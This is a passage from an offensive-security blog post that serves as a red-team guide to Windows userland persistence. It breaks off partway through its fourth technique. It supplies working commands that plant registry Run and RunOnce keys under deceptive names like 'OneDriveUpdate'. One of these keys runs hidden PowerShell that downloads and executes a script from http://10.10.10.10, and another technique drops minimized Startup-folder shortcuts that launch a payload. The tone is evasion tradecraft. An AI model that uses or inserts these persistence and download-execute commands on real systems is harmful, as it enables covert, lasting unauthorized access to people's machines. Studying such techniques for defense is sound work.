---
title: Windows Userland Persistence: 12 Red Team Techniques
url: https://www.hackingdream.net/2026/02/windows-userland-persistence-12-red-team-techniques.html
source: Hacking Dream
date: 2026-02-14
fetch_date: 2026-02-15T04:25:33.740620
---

# Windows Userland Persistence: 12 Red Team Techniques

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### Windows Userland Persistence: 12 Red Team Techniques

[February 15, 2026](https://www.hackingdream.net/2026/02/windows-userland-persistence-12-red-team-techniques.html "permanent link")

Windows Userland Persistence: 12 Red Team Techniques (2025 Guide)

# Windows Userland Persistence: The Senior Red Teamer's Playbook

*Updated on February 15, 2026*

**Table of Contents**

* [Introduction](#intro)
* [Prerequisites](#prereqs)
* [1. Initial Information Gathering](#step1)
* [2. Registry Run Keys (HKCU)](#step2)
* [3. The Startup Folder](#step3)
* [4. Userland Scheduled Tasks](#step4)
* [5. Screensaver Hijacking](#step5)
* [6. PowerShell Profiles](#step6)
* [7. COM Hijacking (Userland)](#step7)
* [8. Logon Scripts (Environment Variables)](#step8)
* [9. File Association Hijacking](#step9)
* [10. BITS Jobs](#step10)
* [11. Office Template Hijacking](#step11)
* [12. Desktop Shortcut Modification (LNK Hijacking)](#step12)
* [Detection & Mitigation](#detection)
* [Conclusion](#conclusion)

## Introduction

Let's be real for a second. Everyone wants Domain Admin. It's the shiny trophy at the end of the race. But in a real red team engagement, you don't always get that level of access immediately. Sometimes, you're stuck as a standard user for days, maybe weeks. If the target reboots their machine and you lose your shell because you were waiting for a privilege escalation exploit, you've failed the most basic requirement of the job: **access**.

That's where **Windows userland persistence** comes in.

Now, I know what you're thinking - "Isn't userland persistence noisy?" "Won't Autoruns catch it?" Sure, if you're lazy. But userland techniques are powerful because they don't require administrative privileges. You can set them up with the context you already have. I've used these exact techniques to maintain access to high-value targets in Fortune 500 environments while the Blue Team was busy watching the domain controllers.

In this guide, I'm going to walk you through 12 battle-tested techniques for maintaining persistence as a low-privileged user on Windows. We'll move from the simple stuff you can do in seconds to more complex methods involving COM hijacking and registry manipulation.

[![Windows Userland Persistence: 12 Red Team Techniques](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLKpYsUHNhqQMlY188lFPQJJIKsNnjBaFI0RVu1YdFCMfQFdY_lxk5kTh9jX-TTi5MGwLkh1xAWwRrqWEDVSyz2XN1VcbDQuLM6wN7SyEFp5LEHETBFyh-RN-A2dhzeyfuu9RcMmVqLIFoNM_qdIeCCKrxraB45hg-BBj2JIPL6hqD95586lCpKFqCVFtK/w640-h358/Windows-Userland-Persistence-12-Red-Team-Techniques.jpg "Windows Userland Persistence: 12 Red Team Techniques")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLKpYsUHNhqQMlY188lFPQJJIKsNnjBaFI0RVu1YdFCMfQFdY_lxk5kTh9jX-TTi5MGwLkh1xAWwRrqWEDVSyz2XN1VcbDQuLM6wN7SyEFp5LEHETBFyh-RN-A2dhzeyfuu9RcMmVqLIFoNM_qdIeCCKrxraB45hg-BBj2JIPL6hqD95586lCpKFqCVFtK/s1024/Windows-Userland-Persistence-12-Red-Team-Techniques.jpg)

## Prerequisites

Before we dive in, let's set the stage. You don't need `SYSTEM` or `Administrator` rights for anything in this article.

* **Access Level:** Standard Domain User or Local User
* **Target Environment:** Windows 10/11, Server 2016/2019/2022
* **Tools:**
  + **PowerShell/CMD:** Native on the box.
  + **C2 Framework (Optional):** Cobalt Strike, Sliver, or just a simple Netcat listener.

For the examples below, I'll be using standard Windows binaries (LOLBins) and PowerShell so you can execute this without dropping custom tools if you don't have to. You might also want to check our guide on [Active Directory Persistence Techniques](https://www.hackingdream.net/2021/05/ad-pentest-cheatsheet-lateral-movement-persistence.html)  to understand how to leverage existing system tools effectively.

## 1. Initial Information Gathering

Before you plant your flag, you need to know where the ground is soft. You can't just throw registry keys around blindly. You need to know the username and the environment variables.

**PowerShell**

```
# Check current user and privileges
whoami /all

# Check environment variables for paths
Get-ChildItem Env:

# List current scheduled tasks to see what's normal (noise reduction)
schtasks /query /fo LIST /v
```

Once you know who you are and where `APPDATA` is, you can start digging in.

## 2. Registry Run Keys (HKCU)

**MITRE ATT&CK: [T1547.001](https://attack.mitre.org/techniques/T1547/001/)**

This is the bread and butter of persistence. It's simple, reliable, but yes, it's the first place defenders look. However, in a large environment with limited monitoring on workstations, this still works surprisingly well.

The key here is `HKCU` (HKEY\_CURRENT\_USER). You have full write access here.

**Bash**

```
# Method 1: The standard Run key
# Note: Use a deceptive name like "OneDriveUpdate" or "WindowsHealth"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveUpdate" /t REG_SZ /d "C:\Users\Public\payload.exe" /f

# Method 2: RunOnce (Good for a single callback after reboot)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "CleanupTask" /t REG_SZ /d "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/payload.ps1')" /f
```

## 3. The Startup Folder

**MITRE ATT&CK: [T1547.001](https://attack.mitre.org/techniques/T1547/001/)**

If you can drop a file, you can persist. The Startup folder is monitored, but if you mask your payload as a legitimate shortcut (`.lnk`), it often slips by. The path we care about is `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`.

**PowerShell**

```
# 1. Switch to the startup directory
cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# 2. Create a simple LNK file using WScript (more stealthy than dropping a batch file)
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Update.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$Shortcut.Arguments = "/c C:\Users\Public\payload.exe"
$Shortcut.WindowStyle = 7  # 7 = Minimized, keeps it out of sight
$Shortcut.Save()
```

## 4. Userland Scheduled Tasks

**MITRE ATT&CK: [T1053.005](https://attack.mitre.org/techniques/T1053/005/)**

Scheduled tasks are flexible and can be triggered by things other than just "time," like system idle or workstation lock/unlock events. You don't need admin rights...